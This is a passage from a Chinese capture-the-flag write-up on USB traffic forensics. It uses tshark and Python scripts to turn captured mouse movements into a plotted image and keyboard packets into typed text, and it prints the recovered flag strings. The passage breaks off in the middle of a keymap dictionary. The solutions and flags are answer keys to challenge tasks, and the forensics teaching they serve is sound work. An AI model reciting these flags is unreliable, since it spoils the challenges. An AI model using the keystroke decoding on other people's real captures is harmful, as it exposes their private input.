class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Wireshark-win64-2.4.3<br>https://pan.baidu.com/s/1nvIIKpr<br>密码：5uao<br></code></pre></td></tr></table></figure><p>提取流量得到usbdata.txt,包含冒号：<img src="https://img-blog.csdnimg.cn/20210412163509262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用上面的mouse.py脚本，即可得到xy.txt。<br><img src="https://img-blog.csdnimg.cn/20210412164602929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入gnuplot工具，把xy.txt文本里的坐标转化为图片<br><img src="https://img-blog.csdnimg.cn/20210412165000484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>翻转一下图片<br><img src="https://img-blog.csdnimg.cn/20210412165426744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">XNCA&#123;U2BPCAPCETEVERYTHING&#125;<br></code></pre></td></tr></table></figure><p>也可以利用python脚本画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27; &#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210412200559583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="实战练习-1"><a href="#实战练习-1" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag信息一般隐藏在USB流量中，通过USB协议数据中的键盘键码转换成键位。</p><p><strong>题目1：</strong><br>分析流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p>usbdata.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现提取出来包含空行，使用命令剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt空余行消失<br><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><p>可以利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在网上找到两个键盘流量脚本</p><p>keyboard1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard.py                 <br>output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>keyboard2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span 